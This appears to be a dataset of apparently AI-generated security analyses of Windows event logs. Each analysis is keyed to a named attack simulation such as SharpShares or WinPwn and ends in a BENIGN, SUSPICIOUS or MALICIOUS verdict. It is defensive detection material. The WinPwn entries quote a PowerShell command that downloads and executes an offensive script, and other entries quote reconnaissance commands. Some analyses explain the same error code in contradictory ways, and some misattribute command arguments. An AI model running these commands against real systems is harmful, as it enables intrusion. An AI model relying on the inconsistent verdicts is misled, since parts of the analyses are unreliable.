  - Enhance monitoring for tools like `AdFind` for detection of potential misuse.
  - Review privileges and access levels for users or scripts responsible for executing such commands.
  - Conduct a focused security review on hosts with similar patterns to ensure no unauthorized access or threats are present.
  
The analysis highlights potential indicators requiring further scrutiny rather than immediate classification as a malicious incident."
Enumerate All Network Shares with SharpShares,"Upon analyzing the provided Windows event logs, I have identified some suspicious activities that may indicate malicious behavior:

1. **PowerShell Execution with Unusual Command Line Arguments**:
   - The Sysmon logs show a PowerShell process (`powershell.exe`) being executed with an unusual command: 
     - `CommandLine`: `""powershell.exe"" & {cmd /c 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\SharpShares.exe' /ldap:all | out-file -filepath \""$env:temp\\dataSharpSharesOutput.txt\""}`
   - This command involves executing a file named `SharpShares.exe` using PowerShell and capturing its output. `SharpShares.exe` is not a standard Windows program, suggesting it might be a custom or potentially malicious tool often used for network share enumeration and auditing. This behavior is commonly associated with lateral movement or reconnaissance activities in a network.

2. **CMD Execution as Part of PowerShell Activity**:
   - The logs show `cmd.exe` being invoked by the same PowerShell command, which further executes `SharpShares.exe`.
   - The command-line specifics and the use of temporary paths indicate potential stealthy activity aimed at avoiding detection.

3. **Repeated Execution of System Utilities**:
   - Activities involving `wevtutil.exe`, `conhost.exe`, and `whoami.exe` seem benign on their own but could be associated with information gathering.

4. **High Integrity Level Processes**:
   - The processes run with ""High"" integrity, indicating elevated permissions. This could suggest privilege escalation efforts or administrative level tasks being performed by potentially unauthorized means.

5. **Context and Timing**:
   - The sequence and timing of these events suggest a scripted or automated sequence of actions, which could indicate a scripted attack or post-exploitation activity.

Based on the analysis, the most notable concern is the execution of `SharpShares.exe` via a convoluted PowerShell and CMD command, coupled with elevated permissions. This kind of behavior is often associated with suspicious or potentially malicious activities typically seen in penetration testing tools or unauthorized network scanning scripts.

### Resolution:
**SUSPICIOUS** - The activity within the logs does not conclusively confirm malicious intent, but the presence of non-standard processes like `SharpShares.exe` suggests that further investigation is necessary. To proceed:
- Conduct a host-based investigation on `Server002` to check for unauthorized software installations or configurations.
- Review network traffic logs around the timestamp of these events for unusual or unexpected connections.
- Verify the intent and legitimacy of `SharpShares.exe` by checking its source and history of deployment within the network environment.
- Contact the user or account owner involved (`SERVER002\\admin_test`) to understand if these activities were part of an approved task or an anomaly."
Process Discovery - Process Hacker,"After reviewing the provided logs, several key observations can be made regarding potential anomalous or suspicious activities:

1. **PowerShell Activity:**
   - **Execution of 'ProcessHacker.exe':** A PowerShell command is being used to start ""ProcessHacker.exe"" from PowerShell with the command: 
     ```powershell
     powershell.exe & {Start-Process -FilePath ""$Env:ProgramFiles\\Process Hacker 2\\ProcessHacker.exe""}
     ```
     Process Hacker is known as a tool sometimes used by system administrators for process inspection and management, but it is also popular within the hacker community due to its capabilities to bypass certain security measures or explore system processes extensively. Its appearance could be benign if expected by the organization or for valid administrative work, but it can just as easily be leveraged for malicious purposes.

2. **Security Log (Event ID 4799):**
   - The security event indicates an attempt to enumerate or modify group membership which can be considered broad in context but could indicate permissions auditing or privilege escalation attempts. The presence of ""setup.exe"" orchestrated by ""EdgeUpdate"" can signal auto-updates or be used as a vector for executing arbitrary tasks. The implication of this within an unauthorized context would bolster further scrutiny.

3. **Sysmon Logs:**
   - **Multiple Instances of Conhost and Wevtutil Launching:** Conhost.exe and wevtutil.exe (Windows Event Utility) usage, related to PowerShell and general execution, could be regular activity unless validated as unusual privilege-operated tasks. The conhost activity seems closely attached to PowerShell tasks.
   - **Repeated PowerShell Executions:** PowerShell is executed several times within short period intervals, highlighting automated or scripting tasks. Dependencies on systems like HOSTNAME.EXE and WHOAMI.EXE reiterates potential system reconnaissance being performed.
   - **SecureBootEncodeUEFI Activity:** This process associated with Secure Boot functions within Windows could be normal if related to updates or startup checks but might deserve scrutiny if seen out of the ordinary or lacking corroborative support explaining its isolation.

### Assessment and Final Resolution:
- **SUSPICIOUS:** The appearance of Process Hacker initiated through a PowerShell script and other related unusual activities as characterized by the system logs do not directly implicate active compromise but deserve expansive investigation. Given the context involves known potentially risky administrative and system-related processes running under PowerShell, understanding the purpose or validation that these activities were sanctioned by infrastructure policy is critical. Moreover, privilege usage from ""setup.exe"" might warrant further review.
  
### Guidance:
- **Immediate Action:**
  - Validate with relevant team members (or relevant system owners) if Process Hacker installation and execution are expected or required in the Server002 environment.
  - Assess administrative policies around PowerShell usage and group modification activities to ensure they align with observed behavior.
  
- **Proactive Measures:**
  - Consider ramping up monitored logging particularly around PowerShell scripts and tracking process creation events to catch any illicit command chains.
  - Ensure regular auditing and inventory on third-party tool usage to ascertain alignment with enterprise security policies.

- **Supplementary Review:** 
  - Conduct vulnerability assessment considering broader indicators from Sysmon events and usage profiles from high-profile tool scripts, perhaps extending to endpoint protection verifications. 

This resolution provides a basis for proactive monitoring and further internal exploration to enhance security posturing while confirming the legitimacy or necessity of these observed behaviors."
Network Share Discovery PowerShell,"The logs provided for analysis comprise entries from the PowerShell, Application, and Sysmon logs. Let's break them down:

1. **PowerShell Logs:**
   - These logs show the execution and invocation of PowerShell (event ID 600 and others related). The only relevant command here seems to be `powershell.exe & {get-smbshare}`. Executing `get-smbshare` is typically used to list shared folders. This activity alone isn't necessarily suspicious unless done by an unauthorized user or during unusual hours. No other commands or scripts appear to be executed.

2. **Application Logs:**
   - These logs indicate normal Windows operations. The `edgeupdate` service stopped — this could be part of a routine update process. Similarly, the `Software Protection Platform Service` event appears benign, related to licensing checks.

3. **Sysmon Logs:**
   - Numerous process creation events are listed. Most notably:
     - Execution of `MicrosoftEdgeUpdateComRegisterShell64.exe` and other related `EdgeUpdate` processes are consistent with legitimate Edge update activities.
     - Several instances of `wevtutil.exe` and `conhost.exe` are seen, executed by `SERVER002\admin_test`. While `wevtutil` is commonly used for managing event logs, frequent or unplanned usage can sometimes denote log tampering efforts. However, there is no direct indication here of any misuse.
     - Usage of utilities such as `hostname.exe` and `whoami.exe` is commonly associated with system reconnaissance but doesn't inherently suggest malicious activity.

**Conclusion:**
- The logs largely present expected activity for a Windows environment with periodic updates, service checks, and process spawning.
- The PowerShell commands don't show malicious intent based on the provided data.
- No explicit indications of privilege escalation, suspicious command-line arguments, or unauthorized executions are identified.

### Resolution: BENIGN
The activity observed appears normal and consistent with routine system management tasks. While monitoring should always continue, no immediate actions are warranted based on the examined log entries."
WinPwn - RBCD-Check,"Upon analyzing the provided event logs, here is a detailed assessment:

### Suspicious or Anomalous Behavior:
1. **PowerShell Activity**:
   - Multiple instances of `PowerShell.exe` (Sysmon EventID 1) were observed being executed with the command line invoking a script from a remote URL (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/...`). The goal of the script is unclear, but the use of `iex` (Invoke-Expression) with `new-object net.webclient` to download and execute script content from the internet is a common tactic used in malicious activities.

2. **Indicators of Malicious Activity**:
   - **Downloading from Untrusted Source**: The script `WinPwn.ps1` appears to be downloaded from a publicly available repository, which might not be trusted. This behavior can be indicative of a script-based attack or privilege escalation attempt.
   - **RBCD-Check Execution**: The usage of a term like `RBCD-Check` suggests potential activity related to testing or manipulating Resource-Based Constrained Delegation, which could be leveraged for lateral movement or privilege escalation.

3. **Process Integrity**:
   - The processes run under `High Integrity Level`, which gives them extensive access to system resources — another indicator that a privileged account has been used to potentially perform unauthorized actions.

### Malicious Activity Indications:
- The combination of downloading and executing scripts from an external source via PowerShell with `High Integrity Level`, along with specific terms like `RBCD-Check`, highly suggests this is a simulation of an attack or pen-testing (reconnaissance or post-exploitation) activity.

### Security Context and Privileges:
- The logs also indicate elevated privileges being used (like `SeSecurityPrivilege`, `SeBackupPrivilege`, etc.), which are typically needed for administrative tasks or can be exploited for malicious purposes.

### Resolution:

Given the context of the logs and the analyses performed, the conclusion based on observable indicators is:

**MALICIOUS**

### Recommendations:
- **Immediate Investigation**: Conduct a full investigation of the account `admin_test` and its activities. Determine if the user is authorized to conduct such activities or if the account has been compromised.
  
- **Network Traffic Analysis**: Review network logs for any communications with the IP address associated with the PowerShell script download to identify any data exfiltration or command and control communications.

- **Isolate the Host**: Until further investigation is complete, consider isolating the involved host (`Server002`) to prevent potential spread or further compromise.

- **Review Organizational Policies**: Ensure security policies are enforced to restrict the execution of PowerShell scripts from untrusted sources and to limit privileges assigned to user accounts.

- **Conduct Threat Hunting**: Perform threat hunting within the network to ensure no other similar activities have occurred."
Remote System Discovery - net,"**Detailed Analysis of Logs:**

1. **System Logs:**
   - The system logs contain Kernel-General events about time change, which are expected whenever time synchronization is performed. The time adjustments done by svchost.exe aligning with Windows Time Service (event ID 35) is standard behavior for NTP synchronization.
   - Windows Update Client events (Events 44 and 43) indicating Microsoft Defender Antivirus definition updates being applied is standard activity for maintaining system security.

2. **Windows PowerShell Logs:**
   - PowerShell events show initialization of several providers such as Registry, Alias, Environment, etc., without specific commands or scripts being run, indicating the initialization phase of PowerShell and not indicative of any malicious activity.

3. **Application Logs:**
   - Logs indicate Windows Defender is active (Event 15), and no anomalous applications or unexpected behavior are noted.

4. **Security Logs:**
   - Repeated 4624 and 4672 events for user ""admin_test"" from a remote desktop connection suggest privileged user logins but no direct evidence of privilege misuse or escalations beyond expected activities.
   - Event 5379 with return code `3221226021` usually indicates ""Access Denied"" for credential use — this is common and not unusual without other indicators of compromise.

5. **Sysmon Logs:**
   - Execution of standard Windows binaries like `whoami`, `conhost`, `net`, etc., from a high-integrity process level suggest typical administrative activities.
   - Notably, command `cmd.exe` executes `net view /domain & net view` to list network resources. While this can be used for reconnaissance activity, there's no strong correlation tying it to any malicious intent without further context or additional suspicious activities.
   - Various processes related to Windows updates and Microsoft Edge installations show standard system maintenance behavior.
   - No processes executing unusual or clearly malicious binaries or command lines present. 

**Assessment:**

- The logs contain primarily benign and routine system activities typical of a Windows server environment undergoing time synchronization, updating Windows Defender definitions, and performing Microsoft Edge updates.
- The PowerShell logging indicates standard initialization without evidence of unauthorized script execution or misuse.
- Although there is login activity by a privileged user, ""admin_test,"" using remote access, there’s no direct indication of misuse, and such activity could be legitimate admin actions.
- Use of commands like `whoami` and `net view` in isolation and given context is not inherently malicious without further corroborating evidence.

**Resolution:** BENIGN

Despite the remote logins and network enumeration commands that could be investigated further in other contexts, there is not enough evidence or clear indicator of malicious activity within these logs. Routine security monitoring should continue, and any unusual behavior related to privileged accounts should be reviewed according to the organization’s security policy."
Enumerate logged on users via CMD (Local),"### Detailed Analysis

Upon reviewing the event logs provided, there are several observations that can be made about potential indicators of suspicious or malicious activity:

1. **Consistent Execution of System Utilities:**
   - The `wevtutil.exe` (Windows Event Utility) and `conhost.exe` (Console Window Host) processes are executed several times in very close succession (within milliseconds). These are common system utilities, and while their usage isn't inherently malicious, such frequent execution implies scripting or automation, which might warrant further attention.

2. **High Integrity Level Execution:**
   - Several processes are executed with a high integrity level (`HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe`). This can be typical when administrative tasks are being carried out; however, it might be alarming in environments where such executions are not regularly audited or expected.

3. **Command Execution Without Clear Context:**
   - The `whoami.exe` and `cmd.exe` executed with the arguments `/c query user` and `whoami`, respectively. These might be utilized to gather system or user information, which is not necessarily harmful unless done without prior authorization.

4. **Frequent Update Executions:**
   - The presence of multiple events relating to ""MicrosoftEdgeUpdate.exe"" could indicate maintenance activity or scheduled updates, especially given the timestamps indicating rapid successive launches. Although this could signify automatic update processes, it's worth ensuring that these update paths and hashes align with legitimate Microsoft updates to exclude the possibility of malicious software masquerading as updates.

5. **Time Manipulation:**
   - There are several events related to the adjustment of the system time. Frequent manipulation of system time (`EventID 4616`) can be suspicious as attackers may attempt to manipulate time to evade timestamp-based defensive mechanisms or logs. The time adjustments observed here seem to be part of a regular adjustment (by `svchost.exe`) and don't immediately suggest malicious intent.

6. **Edge Update Anomalies:**
   - The `MicrosoftEdgeUpdate.exe` and associated processes such as `MicrosoftEdgeUpdateComRegisterShell64.exe` are executed with different parent processes, paths, and session IDs which are typical for legitimate update activities. The rapid sequence of these processes suggests either a legitimate update or potential abuse of such a process.

### Assessment

The activities observed in the logs primarily revolve around system utility executions and Microsoft Edge updates. While there are several instances of automated processes suggestive of maintenance or updates, there isn't clear evidence of compromised activity or malicious intent in the logs provided. The integrity and command-line usage are typical of administrative tasks, albeit repetitive.

### Resolution

- **RESOLUTION: SUSPICIOUS**

This assessment is deemed **suspicious** due to:

- Frequent execution of system utilities without explicit context.
- Time adjustments that could potentially mask activity.
- Rapid and successive `MicrosoftEdgeUpdate.exe` executions, which, although they may be legitimate, should be verified against trusted update sources.

### Guidance

- **Verify Intent**: Confirm whether the processes and updates align with scheduled administrative tasks or system maintenance activities.
- **Audit Logs and Policies**: Implement stricter logging and analysis policies to better identify unauthorized use or creation of scheduled tasks or scripts.
- **Update Verification**: Cross-reference the hashes and files associated with `MicrosoftEdgeUpdate.exe` against known good sources to ensure there is no possibility of tampered or illegitimate software.
- **Monitor Privileged Activity**: Continue to monitor activities that run with high integrity levels and investigate any unapproved access or usage.
"
MSFT Get-GPO Cmdlet,"Upon analyzing the provided Windows event logs, the following points have been noted in the Sysmon log and the Windows PowerShell log:

1. **Unconventional Execution of DismHost.exe**:
   - The process `DismHost.exe` is running from a temporary directory `C:\Users\ADMIN_~1\AppData\Local\Temp\D48C763E-E865-4B4D-ACE5-1BD1680CCD71\`. Normally, `DismHost.exe` is expected to run from the `C:\Windows\System32` directory. Execution from a temporary directory is potentially suspicious and could indicate an attempt to execute malicious code.

2. **PowerShell Activity**:
   - There are several entries for `powershell.exe`, particularly executing with the command `& {Get-GPO -Domain $ENV:userdnsdomain -All >> $env:temp\GPO_Output.txt}`. This command queries Group Policies and redirects them to a file in the temp directory.
   - While PowerShell can be used legitimately by administrators, it is also a common tool used in attacks to perform reconnaissance and execute additional code. The lack of immediate context around this particular usage makes it potentially suspicious.

3. **Frequent Use of Wevtutil.exe**:
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` being executed. `Wevtutil.exe` is a legitimate tool used to read or manage event logs, but excessive or unusual use might indicate clearing of logs to hide malicious activity.

4. **Execution of Whoami.exe and Hostname.exe**:
   - These tools (`whoami.exe` and `hostname.exe`) were executed, which show typical commands for gathering system information. While these commands can be used legitimately, they are also regularly used by attackers to gather context about the machine they have gained access to.

5. **Microsoft Edge Update Activity**:
   - The logs also detail several Microsoft Edge update processes, which seem routine and benign as they involve version updates of Microsoft Edge.

**Assessment**:
- The unconventional execution path for `DismHost.exe` and the use of PowerShell for retrieving Group Policy Objects raise red flags.
- The activity could represent a legitimate administrative or maintenance task, but given the potential for misuse, it requires further examination.
- Wevtutil and conhost activity surrounding the same time frame can indicate attempts at log tampering, which should be further investigated.

**Resolution: SUSPICIOUS**:
- While there is no conclusive evidence of outright malicious activity, the combination of suspicious file paths and PowerShell usage warrants further investigation.
- I recommend reviewing who initiated the PowerShell command and verifying the legitimacy of the `DismHost.exe` execution from the temporary directory.
- Additionally, investigate any potential log manipulation or explore further context around the `wevtutil.exe` usage."
Enumerate Windows Security Log via WevtUtil,"Upon analyzing the provided logs from the Security, System, Sysmon, and Application events, here are the observations and assessment:

1. **Time Synchronization (Event ID 4616 in Security and Kernel-General in System):**
   - Multiple events reflect a change in system time, which in legitimate contexts can be system time synchronization with external time sources. However, time manipulation can be indicative of malicious activity intended to obscure logging timelines or system process sequences. In this case, the time synchronization appears to align with time updates from an NTP source (`time.windows.com`) logged in the System events.
   
2. **Privilege Escalation and High-Privilege Token Usage (Event ID 4672 in Security):**
   - The account ""admin_test"" gained several high-level privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. These privileges are typically associated with administrative accounts and, by themselves, are not indicative of malicious activity unless used unexpectedly or by unauthorized accounts.

3. **Logon Events (Event ID 4624 in Security):**
   - The logon type associated with the ""admin_test"" account is 3, which corresponds to network logon, commonly seen in normal remote access operations. However, cross-referencing with the Sysmon logs is crucial to ensure these are legitimate.

4. **Sysmon Process Events:**
   - Frequent executions of `wevtutil.exe` by the ""admin_test"" account are observed (`wevtutil.exe` is used to manage Windows Event logs). This might be indicative of log tampering or reconnaissance by an attacker trying to enumerate available logs.
   - Execution of commands like `whoami.exe`, `cmd.exe`, and `conhost.exe`, along with `wevtutil enum-logs` originated from ""admin_test"" and occurred in high frequency, indicating potential reconnaissance activity by an entity with administrative privileges.
   
5. **Application Logs:**
   - Observations on the stopping of the `edgeupdate` service appear routine and align with update processes typically involved with Microsoft Edge. There are no immediate signs of these logs being tampered with.

6. **PowerShell Logs:**
   - The absence of entries in the PowerShell log could signify normalcy unless contrasted against expected activity by ""admin_test"".

### Assessment:

- **Suspicious Behavior:** The frequent and close succession use of `wevtutil.exe` and commands like `whoami.exe` from an admin account executing time changes and privilege token accesses suggests suspicious activity, possibly involving reconnaissance or log tampering by a potentially unauthorized user or malicious entity with administrative access.

- **Time Synch Changes:** The time change events, while seemingly aligning with legitimate NTP synchronization, remain generally suspicious in the context of the observed Sysmon events.

### Resolution: SUSPICIOUS

The analysis indicates potential suspicious activity that warrants further investigation. Indicators such as log tampering, privilege escalation, and time changes align with reconnaissance or preparatory actions by an attacker. Follow-up steps should include verifying authentication sources for ""admin_test,"" cross-examining with other logs not provided, and performing a deeper dive into related systems for post-exploitation signals or lateral movement activities. Conduct a review of recent administrative activity for correlation with established change management procedures or legitimate operations."
Enumerate domain computers within Active Directory using DirectorySearcher,"Upon reviewing the log entries provided:

### System Log:
The logs primarily consist of updates to the Windows Defender Antivirus definitions, which is standard behavior and not indicative of malicious activity.

### Application Log:
The log entry shows that Windows Defender is turned on, which is typical and expected for maintaining system security.

### Security Log:
There are multiple Event ID 5379 entries which imply authentication attempts with a return code of 3221226021 indicating an access failure. These log entries likely represent unsuccessful credential validation attempts. Although repeated failures can sometimes be suspicious, these are associated with the `SERVER002$` account within a WORKGROUP, which can occur during normal system operations or misconfigurations.

Event IDs 4624 and 4672 indicate successful logins and privilege assignments related to the SYSTEM account, which are standard operations typical in system processes and services.

### Windows PowerShell Log:
PowerShell scripting seen in the logs involves listing computers from an Active Directory using DirectorySearcher. While PowerShell activities can be indicative of malicious scripting, the command observed here seems more aligned with legitimate administrative tasks rather than any adversarial behavior. 

### Sysmon Log:
A sequence of processes, including `powershell.exe`, `wevtutil.exe`, `whoami.exe`, and several edge update processes, corresponds to expected system administration and update-related activities. While certain tools can be used for both legitimate purposes and ill intent—such as PowerShell and `wevtutil`—the context and repetitive association with administrative updates indicate expected system behavior.

The Edge update and execution process and the use of related executables are consistent with typical automated update processes. `MpSigStub.exe` and `AM_Delta.exe` activities correspond to antivirus definition updates.

### Conclusion:
All activities logged are consistent with legitimate update processes, system maintenance tasks, and standard authentication events, despite some unsuccessful credential validations. There are no explicit indicators of compromise or clear evidence of malicious intent.

### Resolution:
**BENIGN** - The reviewed logs consist of routine system updates and standard authentication entries, aligning with standard operations. However, it’s always prudent to maintain regular monitoring for changes in activity patterns that may signal future issues. No immediate action is needed beyond continued vigilance and routine system auditing."
Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope,"Upon thorough examination of the provided Windows event logs, here is the analysis:

### Sysmon Logs:
- **Processes & Activities**:
  - Repeated execution of `wevtutil.exe` and `conhost.exe` under the user `SERVER002\admin_test`. `wevtutil.exe` is a legitimate utility for managing Windows Event Logs but can be abused by attackers to clear logs or export logs for exfiltration.
  - The sequence and frequency of `wevtutil.exe` and `conhost.exe` executions are unusual but don't necessarily indicate malicious intent without additional suspicious context.
  - Execution of `hostname.exe` and `whoami.exe` is typically benign for retrieving system information and user identity.
  
- **PowerShell Activity**:
  - The PowerShell command `Get-adcomputer -SearchScope subtree -filter ""name -like '*'"" -Properties *` is logged. This command retrieves information about AD computers and is typically used for legitimate administrative purposes. However, it is powerful and can be used for reconnaissance in a compromised environment.

### Application Logs:
- No suspicious activities or errors that stand out. The entries primarily reflect routine operations.

### PowerShell Logs:
- Confirm the execution of a potentially information-gathering script via a PowerShell session as analyzed from the Sysmon logs. This ties back to the AD query, which could indicate either routine administrative tasks or initial exploration by an attacker.

### Security Logs:
- **Time Change Events**: 
  - Events relating to time changes with `svchost.exe` involved could indicate normal system time synchronization, especially involving the time source `time.windows.com`.

### System Logs:
- **Kernel General & Time Service Events**:
  - The presence of time events and sync with `time.windows.com` appear routine for maintaining system time accuracy.

### Assessment:
The combination of activities like querying AD computers via PowerShell and usage of system utilities like `wevtutil`, associated with the same user in a close timeframe, raises suspicion but does not conclusively indicate malicious activity on its own. Such activities can be legitimate in an administrative context but can also be leveraged by adversaries for reconnaissance and log manipulation.

### Conclusion:
- **Resolution: SUSPICIOUS**

Given the potential for reconnaissance activities coupled with `wevtutil` usage, it is advised to investigate further. Specifically, verify the legitimacy of the administrative user `SERVER002\admin_test`, evaluate the necessity and context of the tasks executed, and check for any other indicators of compromise or unauthorized access within this and surrounding timeframes."
Enumerate all accounts (Domain),"### Analysis of Windows Event Logs:

#### Initial Observations
Upon reviewing the log snippets provided, I have noted the following behaviors and events which may indicate potential suspicious activity. 

1. **PowerShell log**: No entries were provided, which limits visibility into potential script-based actions that could be malicious.
2. **Security log**: Not provided, thus missing potential insightful events regarding authentication or security-related changes.
3. **Sysmon log**:
   - Execution of standard system utilities like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `cmd.exe` with high integrity level is observed.
   - An unusually high number of instances of `wevtutil.exe` and `conhost.exe` suggest potential log manipulation or enumeration activities.
   - Execution of commands `net user /domain & net group /domain` using `cmd.exe`, which may signify reconnaissance activities, is concerning.
   - Microsoft Edge Update processes running under `NT AUTHORITY\SYSTEM` are visible, which appears normal but frequent updates could mask other activities.
4. **Application log**:
   - A single event indicating the function of the Software Protection Platform service, which is typical for license validation checks.

#### Suspicious Indicators:
- **Repeated net commands**: Instances of running `net user` and `net group` commands can indicate attempts to gather user and group information, possibly for lateral movement or privilege escalation.
- **Multiple `wevtutil.exe`** executions: Generally used for managing Windows event logs, their execution, especially in high frequency, can indicate an attempt to clear logs or hide tracks.
- **High integrity level**: Several processes, including CMD, running at a high integrity level indicate that the `admin_test` account holds significant privileges which could be leveraged by malicious actors.

#### Assessment:
- **Reconnaissance**: The observed patterns of command execution suggest potential reconnaissance activity. The `net` commands could be used to map out network resources.
- **Possible Evasion**: Frequent `wevtutil.exe` execution might point toward efforts in log manipulation, which is a common tactic for evasion.

### Resolution:
Based on the current logs and lack of Security and PowerShell logs, the behavior is classified as **SUSPICIOUS**. Further investigation is warranted to determine intent and magnitude. 

### Recommended Next Steps:
1. **Further Investigation**: Obtain the missing logs for PowerShell and Security to validate whether these command-line activities align with legitimate administrative tasks or user behavior.
2. **User Activity Verification**: Verify whether the `admin_test` account’s regular activities correlate with observed processes.
3. **Log Integrity**: Check for any potential tampering with event logs, especially related to `wevtutil.exe` executions.
4. **Network Monitoring**: Enhance monitoring for lateral movements or privilege escalation attempts. Consider correlating these events with network traffic analysis.
5. **Alerts & Notifications**: Set up alerts for unusual executions of sensitive command-line actions on high-privilege accounts.

Conclusively, ensure that the usage of administrative privileges and relevant tasks are tightly monitored and verified against authorized activities to mitigate potential risks."
WinPwn - fruit,"**Detailed Analysis:**

Upon reviewing the provided logs, several events raise significant concerns and may indicate malicious activity:

1. **PowerShell Log Entries:**
   - Multiple entries (EventRecordID: 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050) show PowerShell execution with a command to download and execute a script from a GitHub repository URL:
     ``` 
     HostApplication=powershell.exe & {S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
     iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
     fruit -noninteractive -consoleoutput}
     ```
   - The command is attempting to execute `WinPwn.ps1`, which, based on the context and naming, could potentially be a malicious script aimed at compromising or exploiting the system. The use of `iex(new-object net.webclient).downloadstring(...)` is a known technique to execute scripts directly from the internet, often used in attacks.

2. **Security Log Entries:**
   - The user ""admin_test"" logs in with NTLM authentication (EventID 4624) and receives a series of elevated privileges (EventID 4672), including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others potentially risky if misused.
   - The rapid sequence of login and privilege escalation events, especially accompanied by external PowerShell script execution, is suspicious.

3. **Sysmon Log Entries:**
   - Multiple `conhost.exe` and `wevtutil.exe` processes, typically benign, are observed running under the ""admin_test"" user. The frequent invocation of these processes in a short timeframe without corresponding benign context suggests unusual or potentially manipulative actions.

**Assessment:**

Given the nature of the commands being executed in PowerShell and the context of elevated privileges granted to an account named ""admin_test"", there are clear indications of potentially malicious behavior. The PowerShell activity, particularly downloading and executing scripts from the internet, is a known vector for introducing malware or performing unauthorized actions. The associated Sysmon and Security logs support the presence of suspicious activity.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Action:**
   - Isolate the compromised host (Server002) from the network to prevent any further spread of potential malicious activity.
   - Perform a thorough malware scan on the server using a trusted security solution to detect and remediate any threats introduced by the potentially malicious script.

2. **Investigation and Response:**
   - Conduct a detailed forensic analysis on the host to understand the full scope of the compromise, including any changes made by the PowerShell script.
   - Review user accounts, particularly ""admin_test"", to determine how the credentials were used or compromised.

3. **Mitigation and Prevention:**
   - Disable or closely monitor PowerShell script execution policies and restrict unauthorized PowerShell usage.
   - Implement stricter authentication and access controls, particularly for privileged accounts.
   - Consider network monitoring solutions to flag or block potentially malicious outbound connections, such as those observed in the PowerShell logs.

Moving forward, ensure ongoing security awareness training to help users recognize phishing attempts and other social engineering tactics that might lead to such compromises."
System Owner-User Discovery Using Command Prompt,"To systematically analyze these logs for signs of malicious activity or compromise, let's break down the provided event logs into different components and assess each for any suspicious activity.

### System Log

1. **Windows Update Client Events**: The entries with EventID 44, 43, and 19 indicate the execution of Windows Defender Antivirus updates. These updates and their process information (like update title and GUID) appear legitimate and aligned with routine system updates. There are no signs of suspicious command executions or process behaviors in these entries.

### Security Log

2. **Credential Validation Attempts**: All Security log entries with EventID 5379 show multiple attempts to retrieve credentials for various Microsoft account tokens. The process failed with ReturnCode `3221226021`, which corresponds to `STATUS_OBJECT_NAME_NOT_FOUND`. While these repeatedly failed attempts might indicate a possible misconfiguration or issues with Microsoft account services, they do not directly depict malicious behavior such as privilege escalation or unauthorized access attempts.

### Sysmon Log

3. **Process Execution**:
   - Multiple instances of common Windows utilities (like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, `net.exe`, and `net1.exe`) are observed running under a specific user context (`SERVER002\\admin_test`). 
   - The `cmd.exe` entry's command-line instruction involves collecting user information and network user data (events 17948 and 17949). Though these actions could be associated with user reconnaissance typically seen during malicious activities, they could also be normal administrative actions.
   - The command `\""C:\\Windows\\system32\\whoami.exe\""` executed by the `whoami.exe` process is again a typical command used to verify logged-in users, often used for troubleshooting or verification by administrators.

4. **Windows Update Processes**:
   - Updates initiated by `wuauclt.exe`, `AM_Delta.exe`, and `MpSigStub.exe` appear to be part of a routine update cycle, generally a non-suspicious activity.

### Application Log

5. **Windows Defender State**: An Application log entry shows Windows Defender is in an active state (`SECURITY_PRODUCT_STATE_ON`), which signifies ongoing antivirus protection without any indication of compromise.

### Summary and Resolution

After a detailed review of all logs:

- **Potentially Suspicious Activities**:
  - The use of command prompts to echo system states and execute user queries could be part of scripting for legitimate administrative reviews. However, its occurrence suggests looking further into whether these commands align with standard operational protocols or if they deviate from expected usage patterns.
  - The failed credential requests in the Security log also merit further inspection to rule out any attempt to misuse account tokens.

While the current investigation of available evidence points towards routine and benign activity, the behaviors related to information gathering via command prompt and account token validation failures require closer inspection to confidently rule out any unauthorized actions.

Based on the evidence, the final resolution is **SUSPICIOUS**. Further investigation is needed to ensure that user actions match expected behavior and verify that no inappropriate or unauthorized activities are conducted under the guise of administrative tasks. Steps should include verifying the user's roles and permissions, checking if these behaviors align with job functions, and conducting further log correlation or endpoint security reviews."
List Open Egress Ports,"Upon reviewing the provided Windows event logs, several points merit discussion regarding indicators of suspicious or malicious activity. Let's break down each relevant finding.

### Summary of Observations:

#### 1. **PowerShell Activity:**

- The PowerShell logs indicate several PowerShell execution events where scripts are run to connect to an external server (`allports.exposed`) over multiple ports.
- This script is attempting to determine open ports and logs the results locally to a file on the user's desktop.
- The script does not appear to be obfuscated or highly suspicious on its face, but accessing an external server with the name `allports.exposed` could signal intent for network scanning, potentially as part of a reconnaissance effort.

#### 2. **Processes and Commands in Sysmon Logs:**

- Multiple processes initiated by `SERVER002\admin_test`, notably:
  - `powershell.exe` - directly linked to the aforementioned suspicious script.
  - `wevtutil.exe` and `conhost.exe` - typically used for legitimate tasks but could be abused.
  - `whoami.exe` - seen used to check user information; could be part of establishing operational awareness in attack scenarios.
- The integrity level of these processes is ""High"", operated under an admin account (`admin_test`), raising concerns for abuse of privileged access.
  
#### 3. **Other Observations:**

- System and Security logs are empty. These logs are critical for investigating whether other security policies were bypassed or if further suspicious network or user activity took place.
- The presence of processes like `SearchProtocolHost.exe` and `SearchFilterHost.exe` aligns with typical system activity.

### Assessment:

The activity detailed in the logs suggests behavior typical of initial reconnaissance or probing attacks. The targeted network scanning facilitated by PowerShell commands directed at the `allports.exposed` server constitutes unusual behavior, primarily because of the nondescript nature of the server's domain and the intent behind collecting port data. This activity, while potentially benign (perhaps for network diagnostics by an IT admin), could signify a precursor to malicious intents like port scanning for vulnerabilities.

The high integrity level under which these processes ran compels further validation due to potential misuse of administrative privileges.

### Conclusion:

The overall assessment of these logs is:
- **SUSPICIOUS**

### Recommendations:

1. **Immediate Actions:**
   - Verify the intention behind the PowerShell script: Engage with the `admin_test` user or the team responsible for Server002 to determine the legitimacy of running scans against `allports.exposed`.
   - Check firewall and network logs for any unusual traffic to and from the related domain `allports.exposed`.

2. **Further Analyses:**
